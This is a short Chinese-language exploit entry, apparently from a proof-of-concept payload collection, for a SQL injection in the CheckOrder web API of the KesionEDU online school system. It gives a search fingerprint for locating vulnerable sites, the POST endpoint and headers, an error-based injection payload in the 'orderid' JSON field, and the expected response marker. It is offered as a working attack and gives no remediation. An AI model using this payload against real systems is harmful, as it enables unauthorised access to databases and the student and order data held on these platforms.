# 科汛新职教网校系统(KesionEDU)CheckOrder接口存在SQL注入漏洞

- **系统**：科汛新职教网校系统(KesionEDU)CheckOrder接口　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="/KS_Inc/static/edu"`
- **请求**：`POST /webapi/APP/CheckOrder HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=cinc3afe4ncomyiejq2xsj4l`　`Priority: u=1`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 0`

**请求体 / payload**
```
{"orderid":"1' AND 7755 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7755=7755) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113)))-- Ahbw","apptoken":"1","ordertype":"1"}
```
- **预期**：200　|　qkpzq1qqkkq